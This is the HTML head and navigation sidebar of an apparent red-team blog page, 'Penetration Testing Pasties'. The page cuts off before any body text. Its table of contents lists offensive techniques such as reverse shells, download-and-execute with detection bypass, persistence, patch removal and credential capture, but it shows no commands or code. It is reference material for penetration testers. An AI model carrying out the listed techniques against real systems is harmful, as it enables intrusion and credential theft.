



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="Threatexpress Blog">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../../img/favicon.ico">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.3">
    
    
      
        <title>Penetration Testing Pasties - Threatexpress</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/application.30686662.css">
      
        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.a8b3c06d.css">
      
      
        
        
        <meta name="theme-color" content="">
      
    
    
      <script src="../../../assets/javascripts/modernizr.74668098.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../../css/extra.css">
    
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="black" data-md-color-accent="red">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#penetration-testing-pasties" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../.." title="Threatexpress" class="md-header-nav__button md-logo">
          
            <img src="../../../img/threatexpress_logo.png" width="24" height="24">
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Threatexpress
            </span>
            <span class="md-header-nav__topic">
              
                Penetration Testing Pasties
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/threatexpress/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    threatexpress/threatexpress
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../../.." title="Threatexpress" class="md-nav__button md-logo">
      
        <img src="../../../img/threatexpress_logo.png" width="48" height="48">
      
    </a>
    Threatexpress
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/threatexpress/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    threatexpress/threatexpress
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="https://redteam.guide" title="REDTEAM.GUIDE" class="md-nav__link">
      REDTEAM.GUIDE
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
    
    <label class="md-nav__link" for="nav-3">
      Posts
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        Posts
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-1" type="checkbox" id="nav-3-1">
    
    <label class="md-nav__link" for="nav-3-1">
      2020
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-1">
        2020
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../2020/threatbox-standard-attack-platform/" title="ThreatBox - Standard Attack Platform" class="md-nav__link">
      ThreatBox - Standard Attack Platform
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../2020/red-team-development-and-operations/" title="Red Team Development and Operations" class="md-nav__link">
      Red Team Development and Operations
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2" checked>
    
    <label class="md-nav__link" for="nav-3-2">
      2019
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-2">
        2019
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../event-data-collector/" title="Event Data Collector" class="md-nav__link">
      Event Data Collector
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../c2-agent-comparison/" title="C2 Agent Comparison" class="md-nav__link">
      C2 Agent Comparison
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../git-clone-entire-org/" title="Git clone all organizational repos" class="md-nav__link">
      Git clone all organizational repos
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Penetration Testing Pasties
      </label>
    
    <a href="./" title="Penetration Testing Pasties" class="md-nav__link md-nav__link--active">
      Penetration Testing Pasties
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#foca" class="md-nav__link">
    FOCA
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#maltego" class="md-nav__link">
    Maltego
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconng" class="md-nav__link">
    ReconNG
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metagoofil" class="md-nav__link">
    Metagoofil
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#censysio" class="md-nav__link">
    censys.io
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#network-scanning" class="md-nav__link">
    Network Scanning
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dsnrecon" class="md-nav__link">
    dsnrecon
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#theharvester" class="md-nav__link">
    TheHarvester
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    Nmap
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ids-evasion" class="md-nav__link">
    IDS Evasion
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    Web
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#eyewitness" class="md-nav__link">
    Eyewitness
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows" class="md-nav__link">
    Windows
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#built-in-commands" class="md-nav__link">
    Built-in Commands
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dsquery" class="md-nav__link">
    DSQUERY
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlcmd" class="md-nav__link">
    SQLCMD
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ntdsutil" class="md-nav__link">
    NTDSUTIL
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applocker" class="md-nav__link">
    Applocker
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-defender" class="md-nav__link">
    Windows Defender
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appcmd" class="md-nav__link">
    APPCMD
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-lateral-movement" class="md-nav__link">
    Windows Lateral Movement
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-persistence-methods" class="md-nav__link">
    Windows Persistence Methods
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#registry-keys" class="md-nav__link">
    Registry Keys
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#modify-registry-keys" class="md-nav__link">
    Modify registry keys
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#userinit-key" class="md-nav__link">
    Userinit Key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#run-key" class="md-nav__link">
    Run Key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run" class="md-nav__link">
    List Image File Execution Options (Debugger file executed when the target file is run)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appinit_dlls" class="md-nav__link">
    AppInit_DLLs
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#no-reboot-sethcutilman-option-using-a-debugger-key" class="md-nav__link">
    No-reboot sethc/utilman option using a "debugger" key
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-storage-locations" class="md-nav__link">
    File Storage Locations
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#startup-folders" class="md-nav__link">
    Startup Folders
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sethcutilman-replacement" class="md-nav__link">
    SETHC/UTILMAN Replacement
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#volume-shadow-copy-restore-points" class="md-nav__link">
    Volume Shadow Copy (Restore Points)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vssadmin-native-windows-utility" class="md-nav__link">
    VSSADMIN - native windows utility
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy" class="md-nav__link">
    Use WMIC process call to run an .exe from a Volume Shadow Copy
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#task-scheduling" class="md-nav__link">
    Task Scheduling
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#at" class="md-nav__link">
    AT
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#schtasks" class="md-nav__link">
    SCHTASKS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#additional-notes" class="md-nav__link">
    Additional Notes
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-service" class="md-nav__link">
    Windows Service
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dll-hijacking" class="md-nav__link">
    DLL-Hijacking
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#linkinfodll-replacement" class="md-nav__link">
    linkinfo.dll Replacement
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wmi-event-persistence-via-powershell" class="md-nav__link">
    WMI Event Persistence via Powershell
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wmi-event-filter" class="md-nav__link">
    WMI Event Filter
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#event-consumer" class="md-nav__link">
    Event Consumer
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#filterconsumer-binding" class="md-nav__link">
    Filter/Consumer Binding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#removal" class="md-nav__link">
    REMOVAL
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malicious-outlook-rules" class="md-nav__link">
    Malicious Outlook Rules
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-remote-management-winrm-psremoting" class="md-nav__link">
    Windows Remote Management (WinRM) / PSRemoting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uninstall-a-patch-to-leave-the-system-vulnerable" class="md-nav__link">
    Uninstall a patch to leave the system vulnerable
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords" class="md-nav__link">
    Create custom DLL for password filters and install on DC to capture changed passwords
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#application-whitelisting-bypass-techniques" class="md-nav__link">
    Application Whitelisting Bypass Techniques
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#certutil" class="md-nav__link">
    Certutil
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory-enumeration" class="md-nav__link">
    Active Directory Enumeration
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#adfind" class="md-nav__link">
    Adfind
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell" class="md-nav__link">
    Powershell
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-files-custom" class="md-nav__link">
    Find-Files (custom)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-enumeration-custom" class="md-nav__link">
    Get-Enumeration (custom)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-and-execute-iex" class="md-nav__link">
    Download and execute IEX
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#encodedcommand-and-iex-detection-bypass" class="md-nav__link">
    EncodedCommand and IEX detection bypass
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound" class="md-nav__link">
    Bloodhound
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikittenz" class="md-nav__link">
    Mimikittenz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerup" class="md-nav__link">
    PowerUp
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerview" class="md-nav__link">
    PowerView
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#net-functions" class="md-nav__link">
    net * Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gpo-functions" class="md-nav__link">
    GPO functions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#user-hunting-functions" class="md-nav__link">
    User-Hunting Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-trust-functions" class="md-nav__link">
    Domain Trust Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#metafunctions" class="md-nav__link">
    MetaFunctions:
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh" class="md-nav__link">
    Inveigh
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#privilege-requirements" class="md-nav__link">
    Privilege Requirements:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#features" class="md-nav__link">
    Features:
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-wout-powershell" class="md-nav__link">
    Powershell W/out Powershell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-indexeditem" class="md-nav__link">
    Get-IndexedItem
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interacting-w-windows-api" class="md-nav__link">
    Interacting w/ Windows API
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-lock-workstation-and-messagebox" class="md-nav__link">
    Example - Lock Workstation and MessageBox
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mailsniper-owa-and-exchange-enumeration" class="md-nav__link">
    MailSniper (OWA and Exchange Enumeration)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name" class="md-nav__link">
    Locate OWA instances via Autodiscover using only organization primary domain name
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domainpasswordspray-internal-windows-domain-password-brute-forcing" class="md-nav__link">
    DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#quick-start-guide" class="md-nav__link">
    Quick Start Guide
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invoke-domainpasswordspray-options" class="md-nav__link">
    Invoke-DomainPasswordSpray Options
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#misc-powershell-pasties" class="md-nav__link">
    Misc Powershell Pasties
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberoast" class="md-nav__link">
    Kerberoast
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-admin-privesc-methods" class="md-nav__link">
    Domain Admin Privesc Methods
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-and-control" class="md-nav__link">
    Command and Control
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-fronting" class="md-nav__link">
    Domain Fronting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cobalt-strike" class="md-nav__link">
    Cobalt Strike
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#opsec-considerations-for-beacon-commands" class="md-nav__link">
    OPSEC Considerations for Beacon Commands
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-function-wrapper" class="md-nav__link">
    Powershell Function Wrapper
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence-scripts" class="md-nav__link">
    Persistence Scripts
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#empire" class="md-nav__link">
    EMPIRE
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#c2-profiles" class="md-nav__link">
    C2 Profiles
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linux" class="md-nav__link">
    Linux
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bash" class="md-nav__link">
    BASH
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-persistence-ideas" class="md-nav__link">
    Linux Persistence Ideas
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpcclient" class="md-nav__link">
    rpcclient
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enum4linux" class="md-nav__link">
    enum4linux
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iptables" class="md-nav__link">
    iptables
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldapsearch" class="md-nav__link">
    ldapsearch
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nfs" class="md-nav__link">
    NFS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shells" class="md-nav__link">
    Shells
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tty-shells" class="md-nav__link">
    TTY Shells
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bind-shells" class="md-nav__link">
    Bind Shells
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reverse-shells" class="md-nav__link">
    Reverse Shells
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-tunnels" class="md-nav__link">
    SSH Tunnels
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impacket" class="md-nav__link">
    Impacket
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#install-impacket-on-windows" class="md-nav__link">
    Install impacket on Windows
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#secretsdump" class="md-nav__link">
    Secretsdump
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getuserspnspy" class="md-nav__link">
    GetUserSPNS.py
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smbrelayxpy" class="md-nav__link">
    SMBRelayx.py
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#brute-force-techniques" class="md-nav__link">
    Brute Force Techniques
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-exploitation" class="md-nav__link">
    Web Exploitation
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql" class="md-nav__link">
    SQL
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sqli-examples" class="md-nav__link">
    SQLi Examples
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-joins" class="md-nav__link">
    SQL Joins
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mysql" class="md-nav__link">
    MySQL
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#udf-install-for-command-execution" class="md-nav__link">
    UDF Install for Command Execution
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlmap" class="md-nav__link">
    SQLMap
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xss" class="md-nav__link">
    XSS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#server-side-javascript-injection-via-node-or-elementjs" class="md-nav__link">
    Server-side Javascript Injection via Node or ElementJS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cold-fusion" class="md-nav__link">
    Cold Fusion
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java" class="md-nav__link">
    Java
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jboss" class="md-nav__link">
    JBOSS
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java-deserialization" class="md-nav__link">
    Java Deserialization
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jmxinvokerservlet" class="md-nav__link">
    JMXInvokerServlet
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    PHP
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#php-type-juggling" class="md-nav__link">
    PHP Type Juggling
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-sockets" class="md-nav__link">
    Web Sockets
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    Misc
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#decompiling-net-binaries" class="md-nav__link">
    Decompiling .NET Binaries
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#canary-tokens" class="md-nav__link">
    Canary Tokens
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python-ssl-web-server" class="md-nav__link">
    Python SSL Web Server
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mcafee-sitelistxml-decryption" class="md-nav__link">
    McAfee SiteList.xml decryption
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tightvnc-password-retrieval" class="md-nav__link">
    TightVNC Password Retrieval
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-lists" class="md-nav__link">
    Password Lists
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#aix-passwords" class="md-nav__link">
    AIX Passwords
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-ntlm-hash-from-mac-cli" class="md-nav__link">
    Create NTLM Hash from Mac CLI
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hash-cracking-examples" class="md-nav__link">
    Hash Cracking Examples
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-hashes" class="md-nav__link">
    Magic Hashes
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
    
    <label class="md-nav__link" for="nav-3-3">
      2018
    </label>
